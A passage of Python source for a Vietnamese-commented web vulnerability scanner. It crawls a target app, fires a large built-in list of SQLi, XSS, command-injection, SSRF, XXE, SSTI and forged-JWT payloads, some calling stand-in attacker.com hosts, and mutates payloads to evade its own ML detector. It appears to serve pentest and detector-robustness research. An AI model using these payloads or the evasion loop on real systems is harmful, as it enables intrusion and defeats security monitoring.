"""
MODULE 1 — AI VULNERABILITY SCANNER (Active Attacker)
=========================================================
Mục đích: Chủ động quét + giả lập tấn công vào web mục tiêu,
phân tích response để phát hiện lỗ hổng, tạo báo cáo.

Sử dụng:
    python modul1_scanner.py --target http://localhost:5173
    python modul1_scanner.py --target http://localhost:5173 --report
"""

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import re
import json
import time
import argparse
import html
import numpy as np
import tensorflow as tf
from tensorflow.keras.preprocessing.sequence import pad_sequences
import pickle
import os
import logging
from datetime import datetime
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse, urlencode, quote, quote_plus
import random
import copy
from concurrent.futures import ThreadPoolExecutor, as_completed
from dotenv import load_dotenv
from attack_log import AttackLogger

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.common.by import By
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
# ===== LOGGING =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [SCANNER] - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ===== CONFIG =====
MODEL_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "model")
MAX_LEN = 150
ORACLE_THRESHOLD = 75.0   # Ngưỡng trigger mutation (% confidence)
EVASION_THRESHOLD = 50.0  # Nếu conf < giá trị này → coi là evasive
MAX_MUTATION_ROUNDS = 15  # Greedy hill climbing iterations
MAX_WORKERS = 4           # Số luồng song song khi tấn công

# ===== COLOR OUTPUT =====
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'


# ===== HTML FORM PARSER =====
class FormParser(HTMLParser):
    """Phân tích HTML tìm các form và input để tấn công"""
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.links = []

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'GET').upper(),
                'inputs': []
            }
        elif tag == 'input' and self.current_form is not None:
            self.current_form['inputs'].append({
                'name': attrs_dict.get('name', ''),
                'type': attrs_dict.get('type', 'text'),
                'value': attrs_dict.get('value', '')
            })
        elif tag == 'a':
            href = attrs_dict.get('href', '')
            if href and '?' in href:
                self.links.append(href)

    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None


# ===== BỘ PAYLOAD TẤN CÔNG =====
ATTACK_PAYLOADS = {
    "SQLi": [
        "' OR '1'='1",
        "1' OR '1'='1' --",
        "admin' --",
        "1 UNION SELECT username,password FROM users--",
        "1' AND 1=1--",
        "1; DROP TABLE users--",
        "' OR 1=1#",
        "1' UNION SELECT null,null,null,null--",
        "' OR 'x'='x",
        "admin' OR 1=1#",
        "') OR ('1'='1",
        "'; EXEC xp_cmdshell('dir');--",
        "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#"
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "\"><script>alert(document.cookie)</script>",
        "javascript:alert(1)",
        "<body onload=alert('XSS')>",
        "'-prompt(8)-'",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<math><mi>//</mi><script>alert(1)</script></math>",
        "\"><img src=1 onerror=confirm(1)>"
    ],
    "Command Injection": [
        "127.0.0.1; whoami",
        "127.0.0.1 && id",
        "127.0.0.1 | cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "127.0.0.1; ls -la /",
        "ping -c 10 127.0.0.1",
        "| net user",
        "& type C:\\Windows\\win.ini",
        ";wget http://attacker.com/shell.sh"
    ],
    "Path Traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/shadow",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "C:\\boot.ini"
    ],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost:3306",
        "http://0.0.0.0:8080",
        "http://[::1]:80",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
    ],
    "CSRF": [
        "http://attacker.com/csrf/transfer",
        "<form action='/transfer' method='POST' id='csrf'><input type='hidden' name='to' value='hack' /><input type='hidden' name='amount' value='9999' /></form><script>document.getElementById('csrf').submit();</script>",
        "<img src='http://localhost:5170/transfer?to=hacker&amount=9000'>",
        "<html><body><script>fetch('/transfer?to=hacker&amount=9999');</script></body></html>",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "*{7*7}",
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}"
    ],
    "NoSQLi": [
        '{"$gt": ""}',
        '{"$ne": null}',
        "|| 1==1",
        "true, $where: '1 == 1'",
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"$regex": ".*"}',
        '{"$in": ["admin", "root"]}',
        '{"$exists": true}',
        "'; sleep(5000); '",
        '{"$ne": 1}'
    ],
    "XXE": [
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/shadow'>]><root>&test;</root>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/ping'>]><foo>&xxe;</foo>",
        "<!DOCTYPE replace [<!ENTITY ent SYSTEM 'file:///c:/boot.ini'>]><root>&ent;</root>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'> %xxe;]>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></foo>",
        "<!DOCTYPE data SYSTEM \"http://attacker.com/xxe.dtd\"><data>&send;</data>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///proc/self/environ'>]><root>&test;</root>"
    ],
    "JWTAuth": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "eyJhbGciOiJOT05FIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
        "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ."
    ]
}

# Dấu hiệu tấn công thành công trong response
VULN_SIGNATURES = {
    "SQLi": [
        r"\(\d+,\s*'[^']+',\s*'[^']+'",  # (1, 'admin', 'pass')
        r"root:x:0:0",                   # /etc/passwd qua SQLi
        r"syntax error.*SQL",            # SQL error rõ ràng
        r"mysql_fetch_array\(\)",        # PHP MySQL error
        r"ORA-\d{5}:",                   # Oracle error với mã lỗi
        r"Microsoft OLE DB.*error",      # MSSQL error
        r"pg_query\(\).*failed",         # PostgreSQL error
        r"SQLite3::query\(\)",           # SQLite error
    ],
    "XSS": [
        r"<script[^>]*>alert\(",
        r"<img[^>]+onerror\s*=\s*alert",
        r"<svg[^>]+onload\s*=\s*alert",
        r"prompt\(8\)",
    ],
    "Command Injection": [
        r"uid=\d+\(\w+\)\s+gid=\d+",
        r"root:x:0:0:root:/root:",
        r"(?m)^total \d+$\ndrwx",
        r"Windows IP Configuration",
        r"Volume Serial Number",
    ],
    "Path Traversal": [
        r"root:x:0:0:root:/root:/bin/",
        r"\[extensions\]\s*\n.*MAPI=",
        r"daemon:x:\d+:\d+:daemon",
        r"\[boot loader\]",
    ],
    "SSRF": [
        r"ami-id\s*:\s*ami-[a-f0-9]+",
        r"instance-id\s*:\s*i-[a-f0-9]+",
        r"local-ipv4\s*:\s*\d+\.\d+\.\d+",
        r"SSH-2.0-OpenSSH",
        r"mysql_native_password",
        r"Kết quả fetch URL",
    ],
    "CSRF": [
        r"Chuyển tiền thành công",
    ],
    "SSTI": [
        r"49",                           # 7*7
        r"config\.items\(\)",
        r"<class 'subprocess.Popen'>",
    ],
    "NoSQLi": [
        r"MongoError",
        r"Cast to ObjectId failed",
        r"BSON",
        r"NoSQL",
    ],
    "XXE": [
        r"root:x:0:0:",
        r"java\.io\.FileNotFoundException",
        r"XML parser error",
    ],
    "JWTAuth": [
        r"Welcome admin",
        r"Invalid token",
        r"JWT signature",
    ]
}

# ===== PAYLOAD MUTATOR =====
class PayloadMutator:
    """Tao bien the payload bang cach thay doi bieu dien ky tu.

    Ho tro 2 che do:
    - mutate_all(): 1 luot, tra ve tat ca bien the (legacy)
    - guided_mutate(): Greedy Hill Climbing — lap nhieu vong, chon
      mutation giam confidence nhieu nhat, lap lai tren ket qua tot nhat.
    """
    def __init__(self):
        # 6 mutations chinh (safe)
        self.strategies = {
            'case_swap':      self._mutate_case_swap,
            'url_encode':     self._mutate_url_encode,
            'html_entity':    self._mutate_html_entity,
            'sql_comment':    self._mutate_sql_comment,
            'whitespace':     self._mutate_whitespace,
            'concat_split':   self._mutate_concat_split,
        }
        # 2 mutations risky (mac dinh tat)
        self.risky_strategies = {
            'double_encode':  self._mutate_double_encode,
            'null_byte':      self._mutate_null_byte,
        }

    def mutate_all(self, payload):
        """Tra ve list cac bien the payload va ten strategy tuong ung."""
        results = []
        for name, func in self.strategies.items():
            try:
                mutated = func(payload)
                if mutated != payload:
                    results.append({'payload': mutated, 'strategy': name})
            except Exception:
                continue
        return results

    def guided_mutate(self, payload, oracle_fn, max_rounds=MAX_MUTATION_ROUNDS):
        """Greedy Hill Climbing: mutate -> chon best -> mutate tiep.

        Args:
            payload: payload goc
            oracle_fn: function(payload) -> (label, confidence%)
            max_rounds: so vong toi da (default 15)

        Returns:
            dict voi lich su mutation tung buoc:
            {
                'final_payload': str,
                'final_confidence': float,
                'rounds_used': int,
                'history': [{'round': int, 'payload': str,
                             'confidence': float, 'strategy': str}],
                'success': bool,  # confidence < EVASION_THRESHOLD
                'strategies_used': list[str],
            }
        """
        _, current_conf = oracle_fn(payload)
        current = payload
        history = [{
            'round': 0, 'payload': payload,
            'confidence': current_conf, 'strategy': 'original'
        }]
        strategies_used = []
        seen = {payload}  # Tranh lap lai payload da thu

        for round_num in range(1, max_rounds + 1):
            candidates = self.mutate_all(current)
            # Loc bo cac payload da thu
            candidates = [c for c in candidates if c['payload'] not in seen]
            if not candidates:
                break

            # Evaluate tung candidate
            best_candidate = None
            best_conf = current_conf

            for c in candidates:
                seen.add(c['payload'])
                _, conf = oracle_fn(c['payload'])
                if conf < best_conf:
                    best_conf = conf
                    best_candidate = c

            if best_candidate is None:
                break  # Khong tim duoc mutation tot hon -> dung

            current = best_candidate['payload']
            current_conf = best_conf
            strategies_used.append(best_candidate['strategy'])
            history.append({
                'round': round_num,
                'payload': current,
                'confidence': current_conf,
                'strategy': best_candidate['strategy'],
            })

            if current_conf < EVASION_THRESHOLD:
                break  # Da bypass -> dung som

        return {
            'final_payload': current,
            'final_confidence': current_conf,
            'rounds_used': len(history) - 1,
            'history': history,
            'success': current_conf < EVASION_THRESHOLD,
            'strategies_used': strategies_used,
        }

    def _mutate_case_swap(self, payload):
        return ''.join([c.upper() if c.islower() else c.lower() for c in str(payload)])

    def _mutate_url_encode(self, payload):
        return quote(str(payload))

    def _mutate_html_entity(self, payload):
        return html.escape(str(payload))

    def _mutate_sql_comment(self, payload):
        s = str(payload)
        for kw in ['UNION', 'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'FROM']:
            s = re.sub(rf'(?i){kw}', f"{kw[:1]}/**/{kw[1:]}", s)
        return s

    def _mutate_whitespace(self, payload):
        return str(payload).replace(' ', random.choice(['\t', '\n', '\r']))

    def _mutate_concat_split(self, payload):
        return str(payload).replace("'", "CHAR(39)")

    def _mutate_double_encode(self, payload):
        return quote(quote(str(payload)))

    def _mutate_null_byte(self, payload):
        return str(payload) + "%00"


def _infer_endpoint_params(url, method, source_label):
    """Suy luận endpoint params cho API không có query string.

    Tránh bắn param giả vào trang non-API (ví dụ /about, /tuyensinh).
    Returns list of endpoint dicts.
    """
    parsed_path = urlparse(url).path.rstrip('/')
    last_seg = parsed_path.split('/')[-1] if parsed_path else ''
    is_api = bool(re.search(r'/(?:api|v\d+)/', parsed_path))

    results = []
    if method in ('POST', 'PUT', 'PATCH'):
        # POST/PUT thường nhận body → thử các param phổ biến
        for pname in ['id', 'query', 'input', 'data']:
            results.append({
                'url': url, 'param': pname,
                'method': method, 'source': f'{source_label}-body'
            })
    elif is_api or (last_seg and last_seg.isdigit()):
        # GET trên API path hoặc path kết thúc bằng số → thử 'id'
        results.append({
            'url': url, 'param': 'id',
            'method': method, 'source': f'{source_label}-path'
        })
    # else: bỏ qua — page thường không có query param để inject
    return results


# ===== AI ENGINE =====
class AIEngine:
    """Lõi AI — Load model Bi-LSTM để phân loại payload"""
    def __init__(self):
        self.model = None
        self.tokenizer = None
        self.label_encoder = None
        self.loaded = False

    def load(self):
        try:
            self.model = tf.keras.models.load_model(
                os.path.join(MODEL_DIR, 'deep_learning_agent_core.keras')
            )
            with open(os.path.join(MODEL_DIR, 'tokenizer.pkl'), 'rb') as f:
                self.tokenizer = pickle.load(f)
            with open(os.path.join(MODEL_DIR, 'label_encoder.pkl'), 'rb') as f:
                self.label_encoder = pickle.load(f)
            self.loaded = True
            logger.info("✅ AI Engine (Bi-LSTM) đã sẵn sàng")
        except Exception as e:
            logger.warning(f"⚠️ Không load được AI model: {e}")
            logger.warning("   Scanner vẫn chạy được (chế độ rule-based)")
            self.loaded = False

    def classify(self, payload):
        """Phân loại payload bằng AI model"""
        if not self.loaded:
            return "Unknown", 0.0
        try:
            seq = self.tokenizer.texts_to_sequences([str(payload)])
            pad = pad_sequences(seq, maxlen=MAX_LEN, padding='post', truncating='post')
            pred = self.model.predict(pad, verbose=0)[0]
            idx = np.argmax(pred)
            label = self.label_encoder.inverse_transform([idx])[0]
            confidence = float(pred[idx]) * 100
            return label, confidence
        except:
            return "Unknown", 0.0

    def classify_batch(self, payloads):
        """Batch classify a list of payloads. Returns list of (label, confidence)."""
        if not self.loaded:
            return [("Unknown", 0.0) for _ in payloads]
        seqs = self.tokenizer.texts_to_sequences([str(p) for p in payloads])
        pads = pad_sequences(seqs, maxlen=MAX_LEN, padding='post', truncating='post')
        preds = self.model.predict(pads, verbose=0)
        results = []
        for pred in preds:
            idx = np.argmax(pred)
            label = self.label_encoder.inverse_transform([idx])[0]
            confidence = float(pred[idx]) * 100
            results.append((label, confidence))
        return results

    def is_detected(self, payload):
        """Oracle check: returns (detected_bool, label, confidence)."""
        label, conf = self.classify(payload)
        detected = (label != "Normal" and conf >= ORACLE_THRESHOLD)
        return detected, label, conf


# ===== SCANNER CHÍNH =====
class VulnerabilityScanner:
    """
    Module 1 — Active Vulnerability Scanner
    Chủ động tấn công thử vào web mục tiêu, phân tích response.
    """

    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.ai_brain_enabled = False  # Not used, kept for compatibility
        self.ai = AIEngine()
        self.ai.load()
        self.session = requests.Session()
        self.session.verify = False  # Bỏ qua lỗi SSL (thích hợp cho pentest/CTF)
        self.session.headers.update({
            'User-Agent': 'AI-SecurityScanner/1.0 (Module1-PenTest)'
        })
        self.vulnerabilities = []    # Danh sach lo hong phat hien
        self.scan_results = []       # Tat ca ket qua scan
        self.endpoints = []          # Cac endpoint tim duoc
        self.start_time = None
        self.end_time = None
        self._attack_payloads = ATTACK_PAYLOADS  # Ban tham chieu mac dinh
        self._stats_lock = __import__('threading').Lock()
        self.attack_logger = AttackLogger()  # SQLite attack log
        self.attack_logger.clear()           # Xoa log cu moi lan scan moi
        # Stats for adversarial analysis + security metrics
        self.adv_stats = {
            'total_original': 0,
            'model_detected': 0,
            'mutations_tried': 0,
            'evasions_found': 0,
            'mutation_effectiveness': {},
            # === SECURITY METRICS ===
            'bypass_rate': 0.0,
            'attack_success_rate': 0.0,
            'time_to_bypass_list': [],      # list of seconds
            'rounds_to_bypass_list': [],    # list of round counts
            'bypass_payloads': [],          # log payload da bypass
        }

    def banner(self):
        print(f"""
{Color.CYAN}{Color.BOLD}
╔══════════════════════════════════════════════════════╗
║   AI VULNERABILITY SCANNER — MODULE 1            ║
║  Active Attack Simulation & Vulnerability Detection  ║
╠══════════════════════════════════════════════════════╣
║  Target : {self.target_url:<41s}║
║  Engine : Bi-LSTM Deep Learning + Rule-Based         ║
║  Mode   : Giả lập tấn công (Pentest Simulation)     ║
╚══════════════════════════════════════════════════════╝
{Color.END}""")

    # ----- Phase 1: Crawl tìm endpoint -----
    def crawl_target(self):
        """Crawl trang chủ, tìm tất cả form và link có parameter"""
        print(f"\n{Color.BLUE}[Phase 1] 🔍 Crawling target...{Color.END}")

        try:
            resp = self.session.get(self.target_url, timeout=10)
            if resp.status_code != 200:
                print(f"  {Color.RED}❌ Target trả về HTTP {resp.status_code}{Color.END}")
                return False
        except requests.ConnectionError:
            print(f"  {Color.RED}❌ Không kết nối được tới {self.target_url}{Color.END}")
            print(f"  {Color.YELLOW}💡 Hãy chạy: python webtest.py (port 5173){Color.END}")
            return False

        # Parse forms
        parser = FormParser()
        parser.feed(resp.text)

        # Thêm các form tìm được
        for form in parser.forms:
            action = urljoin(self.target_url, form['action'])
            for inp in form['inputs']:
                if inp['name'] and inp['type'] not in ['submit', 'button', 'hidden']:
                    self.endpoints.append({
                        'url': action,
                        'param': inp['name'],
                        'method': form['method'],
                        'source': 'form'
                    })

        # Thêm các link có query params
        for link in parser.links:
            full_url = urljoin(self.target_url, link)
            parsed = urlparse(full_url)
            if parsed.query:
                for part in parsed.query.split('&'):
                    if '=' in part:
                        param = part.split('=')[0]
                        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        self.endpoints.append({
                            'url': base_url,
                            'param': param,
                            'method': 'GET',
                            'source': 'link'
                        })
        if not self.endpoints:
            print(f"  {Color.YELLOW}⚠️  Không tìm thấy form tĩnh → thử quét JS động...{Color.END}")
            dynamic = self.extract_dynamic_endpoints(self.target_url)
            self.endpoints.extend(dynamic)
            bundle_endpoints = self.scan_js_bundles(self.target_url)
            self.endpoints.extend(bundle_endpoints)

        # Loại bỏ trùng lặp
        seen = set()
        unique = []
        for ep in self.endpoints:
            key = f"{ep['url']}|{ep['param']}"
            if key not in seen:
                seen.add(key)
                unique.append(ep)
        self.endpoints = unique

        print(f"  ✅ Tìm thấy {Color.BOLD}{len(self.endpoints)}{Color.END} điểm đầu vào:")
        for ep in self.endpoints:
            print(f"     • {ep['method']} {ep['url']}  →  param: {Color.YELLOW}{ep['param']}{Color.END}")

        return len(self.endpoints) > 0

    def extract_dynamic_endpoints(self, url):
        """Dùng Selenium để bắt network requests và quét endpoint động của SPA."""
        if not SELENIUM_AVAILABLE:
            print(f"  {Color.YELLOW}⚠️  Selenium chưa cài.{Color.END}")
            return []

        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})

        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)

        endpoints = []
        try:
            print(f"  {Color.CYAN}🌐 Đang render + bắt API calls: {url}{Color.END}")
            driver.get(url)
            time.sleep(4)

            # DEBUG: dump HTML ra file để kiểm tra
            with open("debug_selenium.html", "w", encoding="utf-8") as f:
                f.write(driver.page_source)
            print("  🔍 DEBUG: Đã lưu HTML render vào debug_selenium.html")
            print(f"  🔍 DEBUG: Title trang = '{driver.title}'")
            print(
                f"  🔍 DEBUG: Số thẻ <input> tìm thấy = "
                f"{len(driver.find_elements(By.TAG_NAME, 'input'))}"
            )
            print(
                f"  🔍 DEBUG: Số thẻ <form> tìm thấy = "
                f"{len(driver.find_elements(By.TAG_NAME, 'form'))}"
            )

            driver.execute_script("""
                window._capturedRequests = [];
                const origFetch = window.fetch;
                window.fetch = function(...args) {
                    window._capturedRequests.push({url: args[0], method: (args[1]?.method || 'GET')});
                    return origFetch.apply(this, args);
                };
                const origOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function(method, reqUrl) {
                    window._capturedRequests.push({url: reqUrl, method: method});
                    return origOpen.apply(this, arguments);
                };
            """)

            driver.execute_script("window.scrollTo(0, document.body.scrollHeight)")
            time.sleep(2)

            try:
                logs = driver.get_log('performance')
                for entry in logs:
                    log = json.loads(entry['message'])['message']
                    if log.get('method') != 'Network.requestWillBeSent':
                        continue

                    req = log['params']['request']
                    req_url = req['url']
                    method = req['method']

                    if any(
                        req_url.endswith(ext)
                        for ext in ['.js', '.css', '.png', '.jpg', '.ico', '.woff', '.map']
                    ):
                        continue

                    if 'localhost' in req_url or urlparse(url).netloc in req_url:
                        parsed = urlparse(req_url)
                        if parsed.query:
                            for part in parsed.query.split('&'):
                                if '=' in part:
                                    param = part.split('=')[0]
                                    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                                    endpoints.append({
                                        'url': base,
                                        'param': param,
                                        'method': method,
                                        'source': 'network-query'
                                    })
                        else:
                            # Suy luận param thông minh thay vì hard-code 'id'
                            endpoints.extend(_infer_endpoint_params(
                                req_url, method, 'network-api'))
            except Exception as e:
                print(f"  {Color.YELLOW}⚠️  Performance log lỗi: {e}{Color.END}")

            try:
                captured_requests = driver.execute_script("return window._capturedRequests || [];")
                for req in captured_requests:
                    req_url = req.get('url')
                    method = (req.get('method') or 'GET').upper()
                    if not req_url:
                        continue
                    req_url = urljoin(url, req_url)
                    parsed = urlparse(req_url)
                    if parsed.query:
                        for part in parsed.query.split('&'):
                            if '=' in part:
                                param = part.split('=')[0]
                                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                                endpoints.append({
                                    'url': base,
                                    'param': param,
                                    'method': method,
                                    'source': 'captured-xhr'
                                })
                    else:
                        # Suy luận param thông minh thay vì hard-code 'id'
                        endpoints.extend(_infer_endpoint_params(
                            req_url, method, 'captured-xhr'))
            except Exception as e:
                print(f"  {Color.YELLOW}⚠️  Captured request log lỗi: {e}{Color.END}")

            try:
                api_paths = driver.execute_script("""
                    const scripts = Array.from(document.querySelectorAll('script[src]'));
                    return scripts.map(s => s.src).filter(
                        s => s.includes('localhost') || s.includes('assets')
                    );
                """)
                for script_url in api_paths[:5]:
                    try:
                        resp = self.session.get(script_url, timeout=5)
                        patterns = re.findall(r'["\\`](/api/[a-zA-Z0-9/_\\-]+)["\\`]', resp.text)
                        patterns += re.findall(r'["\\`](/v\\d+/[a-zA-Z0-9/_\\-]+)["\\`]', resp.text)
                        for path in set(patterns):
                            full_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}{path}"
                            endpoints.append({
                                'url': full_url,
                                'param': 'id',
                                'method': 'GET',
                                'source': 'js-bundle-inline'
                            })
                    except Exception:
                        pass
            except Exception as e:
                print(f"  {Color.YELLOW}⚠️  JS scan lỗi: {e}{Color.END}")

            all_inputs = driver.find_elements(By.TAG_NAME, "input")
            existing_params = {ep['param'] for ep in endpoints}
            for inp in all_inputs:
                name = (
                    inp.get_attribute("name")
                    or inp.get_attribute("id")
                    or inp.get_attribute("placeholder")
                    or inp.get_attribute("v-model")
                )
                if name and name not in existing_params:
                    endpoints.append({
                        'url': url,
                        'param': name,
                        'method': 'GET',
                        'source': 'dom-input'
                    })
                    existing_params.add(name)

            seen = set()
            unique = []
            for ep in endpoints:
                key = f"{ep['url']}|{ep['param']}|{ep['method']}"
                if key not in seen:
                    seen.add(key)
                    unique.append(ep)
            endpoints = unique

        except Exception as e:
            print(f"  {Color.RED}❌ Lỗi: {e}{Color.END}")
        finally:
            driver.quit()

        print(f"  ✅ Tìm thêm {Color.BOLD}{len(endpoints)}{Color.END} endpoints động")
        return endpoints

    def scan_js_bundles(self, base_url):
        """Tìm API endpoints ẩn trong JS bundle files."""
        print(f"  {Color.CYAN}📦 Quét JS bundles...{Color.END}")
        found = []
        try:
            resp = self.session.get(base_url, timeout=10)
            js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', resp.text)
            for js_path in js_files[:10]:
                js_url = urljoin(base_url, js_path)
                try:
                    js_resp = self.session.get(js_url, timeout=5)
                    paths = re.findall(
                        r'["\\`](/(?:api|v\\d+)/[a-zA-Z0-9/_\\-]{3,})["\\`]',
                        js_resp.text
                    )
                    for path in set(paths):
                        full = (
                            f"{urlparse(base_url).scheme}://"
                            f"{urlparse(base_url).netloc}{path}"
                        )
                        found.append({
                            'url': full,
                            'param': 'id',
                            'method': 'GET',
                            'source': 'js-bundle'
                        })
                        print(f"     • Phát hiện API: {Color.YELLOW}{path}{Color.END}")
                except Exception:
                    pass
        except Exception:
            pass
        return found

    # ----- Phase 2: Tấn công giả lập -----
    def attack_endpoint(self, endpoint, attack_type, payload):
        """Gửi 1 payload tấn công vào 1 endpoint, phân tích kết quả"""
        url = endpoint['url']
        param = endpoint['param']

        try:
            if endpoint['method'] == 'GET':
                resp = self.session.get(url, params={param: payload}, timeout=5)
            else:
                resp = self.session.post(url, data={param: payload}, timeout=5)

            is_vulnerable = False
            evidence = []

            if attack_type in VULN_SIGNATURES:
                for pattern in VULN_SIGNATURES[attack_type]:
                    match = re.search(pattern, resp.text, re.IGNORECASE | re.MULTILINE)
                    if match:
                        is_vulnerable = True
                        evidence.append(f"Pattern match: {match.group()[:60]}")

            if attack_type == "XSS":
                if payload in resp.text and html.escape(payload) != payload:
                    is_vulnerable = True
                    evidence.append("Payload reflected unencoded")

            # AI classification
            ai_label, ai_conf = self.ai.classify(payload)

            result = {
                'endpoint': url,
                'param': param,
                'method': endpoint['method'],
                'attack_type': attack_type,
                'payload': payload,
                'status_code': resp.status_code,
                'is_vulnerable': is_vulnerable,
                'evidence': evidence,
                'ai_classification': ai_label,
                'ai_confidence': ai_conf,
                'response_length': len(resp.text),
                'timestamp': datetime.now().isoformat()
            }

            self.scan_results.append(result)

            if is_vulnerable:
                self.vulnerabilities.append(result)

            return result

        except requests.Timeout:
            return {'payload': payload, 'error': 'Timeout', 'is_vulnerable': False}
        except Exception as e:
            return {'payload': payload, 'error': str(e), 'is_vulnerable': False}

    def run_attacks(self):
        """Phase 2: Adversarial Greedy Hill Climbing — guided mutation loop."""
        mutator = PayloadMutator()
        
        def attack_single(task):
            """Một unit công việc: (endpoint, attack_type, payload)"""
            ep, attack_type, payload = task
            
            with self._stats_lock:
                self.adv_stats['total_original'] += 1

            # ---- Oracle check ----
            detected, orig_label, orig_conf = self.ai.is_detected(payload)

            mutation_result = None
            model_evaded = False
            best_payload = payload
            best_strategy = 'original'
            rounds_used = 0
            mutation_time = 0.0

            if detected:
                with self._stats_lock:
                    self.adv_stats['model_detected'] += 1
                t_start = time.time()
                mutation_result = mutator.guided_mutate(
                    payload, self.ai.classify, MAX_MUTATION_ROUNDS
                )
                mutation_time = time.time() - t_start
                
                with self._stats_lock:
                    self.adv_stats['mutations_tried'] += mutation_result['rounds_used']
                    rounds_used = mutation_result['rounds_used']
                    best_payload = mutation_result['final_payload']

                    for s in mutation_result['strategies_used']:
                        self.adv_stats['mutation_effectiveness'].setdefault(s, 0)
                        self.adv_stats['mutation_effectiveness'][s] += 1

                    if mutation_result['success']:
                        model_evaded = True
                        self.adv_stats['evasions_found'] += 1
                        self.adv_stats['time_to_bypass_list'].append(mutation_time)
                        self.adv_stats['rounds_to_bypass_list'].append(rounds_used)
                        best_strategy = '->'.join(mutation_result['strategies_used'])
                        self.adv_stats['bypass_payloads'].append({
                            'attack_type': attack_type,
                            'original': payload,
                            'bypassed': best_payload,
                            'conf_original': orig_conf,
                            'conf_final': mutation_result['final_confidence'],
